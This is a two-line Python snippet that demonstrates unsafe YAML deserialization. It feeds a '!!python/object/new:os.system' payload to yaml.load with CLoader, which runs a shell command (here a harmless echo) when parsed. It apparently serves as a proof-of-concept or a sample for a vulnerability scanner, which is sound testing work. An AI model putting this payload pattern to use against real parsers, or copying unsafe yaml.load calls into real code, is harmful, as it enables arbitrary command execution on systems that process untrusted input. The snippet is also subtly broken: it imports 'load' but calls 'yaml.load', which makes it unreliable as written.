from yaml import load, CLoader
yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", CLoader)
